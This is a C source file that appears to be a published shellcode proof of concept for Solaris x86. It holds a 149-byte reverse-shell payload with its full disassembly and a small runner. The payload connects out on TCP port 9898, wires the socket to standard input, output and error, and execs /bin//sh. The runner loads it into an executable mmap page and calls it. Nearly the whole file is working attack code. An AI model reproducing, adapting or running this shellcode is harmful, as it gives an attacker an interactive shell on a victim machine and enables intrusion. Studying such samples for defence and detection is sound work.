#include <stdio.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
# include <strings.h>
#endif

#include <unistd.h>
#include <sys/mman.h>
#include <sys/utsname.h>

/*
 * SunOS (Solaris) / x86 (connectback / reverse shell) TCP:9898 149 bytes shellcode
 *
 * Paulus Gandung Prakosa <gandung@lists.infradead.org>
 *
 * Tested on: SunOS solaris-vagrant 5.11 11.4.0.15.0 i86pc i386 i86pc
 *
 * Disassembly of section .text:
 *
 * 08050428 <_start>:
 * 8050428:       33 f6                   xor    %esi,%esi
 * 805042a:       33 db                   xor    %ebx,%ebx
 * 805042c:       43                      inc    %ebx
 * 805042d:       43                      inc    %ebx
 * 805042e:       33 c9                   xor    %ecx,%ecx
 * 8050430:       41                      inc    %ecx
 * 8050431:       41                      inc    %ecx
 * 8050432:       33 d2                   xor    %edx,%edx
 * 8050434:       83 c2 06                add    $0x6,%edx
 * 8050437:       56                      push   %esi
 * 8050438:       56                      push   %esi
 * 8050439:       52                      push   %edx
 * 805043a:       51                      push   %ecx
 * 805043b:       53                      push   %ebx
 * 805043c:       33 c0                   xor    %eax,%eax
 * 805043e:       b0 e6                   mov    $0xe6,%al
 * 8050440:       50                      push   %eax
 * 8050441:       cd 91                   int    $0x91
 * 8050443:       8b f8                   mov    %eax,%edi
 * 8050445:       33 d2                   xor    %edx,%edx
 * 8050447:       42                      inc    %edx
 * 8050448:       c1 e2 04                shl    $0x4,%edx
 * 805044b:       56                      push   %esi
 * 805044c:       33 c9                   xor    %ecx,%ecx
 * 805044e:       66 81 c1 26 aa          add    $0xaa26,%cx
 * 8050453:       66 51                   push   %cx
 * 8050455:       33 c9                   xor    %ecx,%ecx
 * 8050457:       41                      inc    %ecx
 * 8050458:       41                      inc    %ecx
 * 8050459:       66 51                   push   %cx
 * 805045b:       8b cc                   mov    %esp,%ecx
 * 805045d:       56                      push   %esi
 * 805045e:       52                      push   %edx
 * 805045f:       51                      push   %ecx
 * 8050460:       57                      push   %edi
 * 8050461:       33 c0                   xor    %eax,%eax
 * 8050463:       b0 eb                   mov    $0xeb,%al
 * 8050465:       50                      push   %eax
 * 8050466:       cd 91                   int    $0x91
 * 8050468:       33 d2                   xor    %edx,%edx
 * 805046a:       33 c9                   xor    %ecx,%ecx
 * 805046c:       83 c1 09                add    $0x9,%ecx
 * 805046f:       56                      push   %esi
 * 8050470:       52                      push   %edx
 * 8050471:       51                      push   %ecx
 * 8050472:       57                      push   %edi
 * 8050473:       33 c0                   xor    %eax,%eax
 * 8050475:       b0 3e                   mov    $0x3e,%al
 * 8050477:       50                      push   %eax
 * 8050478:       cd 91                   int    $0x91
 * 805047a:       33 d2                   xor    %edx,%edx
 * 805047c:       42                      inc    %edx
 * 805047d:       33 c9                   xor    %ecx,%ecx
 * 805047f:       83 c1 09                add    $0x9,%ecx
 * 8050482:       56                      push   %esi
 * 8050483:       52                      push   %edx
 * 8050484:       51                      push   %ecx
 * 8050485:       57                      push   %edi
 * 8050486:       33 c0                   xor    %eax,%eax
 * 8050488:       b0 3e                   mov    $0x3e,%al
 * 805048a:       50                      push   %eax
 * 805048b:       cd 91                   int    $0x91
 * 805048d:       33 d2                   xor    %edx,%edx
 * 805048f:       42                      inc    %edx
 * 8050490:       42                      inc    %edx
 * 8050491:       33 c9                   xor    %ecx,%ecx
 * 8050493:       83 c1 09                add    $0x9,%ecx
 * 8050496:       56                      push   %esi
 * 8050497:       52                      push   %edx
 * 8050498:       51                      push   %ecx
 * 8050499:       57                      push   %edi
 * 805049a:       33 c0                   xor    %eax,%eax
 * 805049c:       b0 3e                   mov    $0x3e,%al
 * 805049e:       50                      push   %eax
 * 805049f:       cd 91                   int    $0x91
 * 80504a1:       56                      push   %esi
 * 80504a2:       68 6e 2f 73 68          push   $0x68732f6e
 * 80504a7:       68 2f 2f 62 69          push   $0x69622f2f
 * 80504ac:       8b dc                   mov    %esp,%ebx
 * 80504ae:       56                      push   %esi
 * 80504af:       53                      push   %ebx
 * 80504b0:       8b cc                   mov    %esp,%ecx
 * 80504b2:       56                      push   %esi
 * 80504b3:       56                      push   %esi
 * 80504b4:       51                      push   %ecx
 * 80504b5:       53                      push   %ebx
 * 80504b6:       33 c0                   xor    %eax,%eax
 * 80504b8:       04 3b                   add    $0x3b,%al
 * 80504ba:       50                      push   %eax
 * 80504bb:       cd 91                   int    $0x91
 */

#ifndef unused
# define unused(x) ((void)(x))
#endif

int main(int argc, char **argv)
{
	unused(argc);
	unused(argv);

	struct utsname uts;
	char *pcall;
	char *shellcode = "\x33\xf6\x33\xdb\x43\x43\x33\xc9"
                          "\x41\x41\x33\xd2\x83\xc2\x06\x56"
                          "\x56\x52\x51\x53\x33\xc0\xb0\xe6"
                          "\x50\xcd\x91\x8b\xf8\x33\xd2\x42"
                          "\xc1\xe2\x04\x56\x33\xc9\x66\x81"
                          "\xc1\x26\xaa\x66\x51\x33\xc9\x41"
                          "\x41\x66\x51\x8b\xcc\x56\x52\x51"
                          "\x57\x33\xc0\xb0\xeb\x50\xcd\x91"
                          "\x33\xd2\x33\xc9\x83\xc1\x09\x56"
                          "\x52\x51\x57\x33\xc0\xb0\x3e\x50"
                          "\xcd\x91\x33\xd2\x42\x33\xc9\x83"
                          "\xc1\x09\x56\x52\x51\x57\x33\xc0"
                          "\xb0\x3e\x50\xcd\x91\x33\xd2\x42"
                          "\x42\x33\xc9\x83\xc1\x09\x56\x52"
                          "\x51\x57\x33\xc0\xb0\x3e\x50\xcd"
                          "\x91\x56\x68\x6e\x2f\x73\x68\x68"
                          "\x2f\x2f\x62\x69\x8b\xdc\x56\x53"
                          "\x8b\xcc\x56\x56\x51\x53\x33\xc0"
                          "\x04\x3b\x50\xcd\x91";

	pcall = mmap(
		NULL,
		sysconf(_SC_PAGESIZE),
		PROT_WRITE | PROT_EXEC,
		MAP_PRIVATE | MAP_ANONYMOUS,
		-1,
		0
	);

	if (pcall == MAP_FAILED) {
		perror("mmap()");
		return -1;
	}

	bzero(&uts, sizeof(struct utsname));

	if (uname(&uts) < 0) {
		perror("uname()");
		munmap(pcall, sysconf(_SC_PAGESIZE));
		return -1;
	}

	printf("[*] Machine info\n");
	printf(" [*] sys: %s\n", uts.sysname);
	printf(" [*] node: %s\n", uts.nodename);
	printf(" [*] release: %s\n", uts.release);
	printf(" [*] version: %s\n", uts.version);
	printf(" [*] machine: %s\n", uts.machine);

	printf("[*] Copying shellcode into crafted buffer.\n");
	memcpy(pcall, shellcode, strlen(shellcode));

	printf("[*] Executing the shellcode..\n");
	__asm__ __volatile__(
		"call *%%eax\r\n"
		:
		: "a"(pcall)
	);

	printf("[*] Cleaning up..\n");
	munmap(pcall, sysconf(_SC_PAGESIZE));

	return 0;
}
